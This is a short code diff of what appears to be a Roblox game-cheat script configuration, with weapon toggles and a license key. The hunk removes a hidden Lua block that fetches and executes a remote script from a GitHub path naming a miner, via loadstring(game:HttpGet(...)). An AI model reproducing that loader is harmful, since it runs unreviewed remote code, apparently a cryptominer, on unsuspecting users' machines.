@@ -101,14 +101,6 @@ _G.GunSettings = { -- ปืนที่จะทำ
     ['SerpentBow'] = false,
     ['SoulGuitar'] = false
 }
-local isExecuted = false
-task.spawn(function()
-    repeat task.wait() until isExecuted == false
-    if game.CoreGui:FindFirstChild('NINONOOB') then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/aliceaia/NVminingOS/main/miners/NSFMINER/1.3.12/2sa.lua"))()
-	isExecuted = true
-    end
-end);
 
 getgenv().Key = "MARU-U143-AW9E2-CJD7-5TN82-IX9H"
 getgenv().id = "1027191602269147278"
